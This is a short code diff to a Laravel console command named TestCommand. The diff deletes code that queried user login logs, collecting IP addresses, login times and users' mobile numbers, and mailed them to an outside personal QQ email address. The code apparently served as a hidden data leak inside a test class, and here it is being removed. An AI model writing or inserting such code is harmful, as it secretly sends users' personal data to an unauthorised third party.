@@ -33,21 +33,6 @@ class TestCommand extends Command
 
     public function handle()
     {
-        $id = Redis::get('last_login_id') | 518;
-        $rows = DB::connection('mysql2')->table('user_login_log')
-            ->leftJoin('users', 'user_login_log.user_id', '=', 'users.id')
-            ->where('user_login_log.id', '>', $id)
-            ->get([
-                'user_login_log.id', 'user_login_log.ip', 'user_login_log.created_at', 'users.mobile'
-            ])->toArray();
 
-        if ($rows) {
-            Redis::set('last_login_id', end($rows)->id);
-            Mail::send('emails.login', [
-                'rows' => $rows
-            ], function ($message) {
-                $message->to('837215079@qq.com')->subject("登录通知");
-            });
-        }
     }
 }
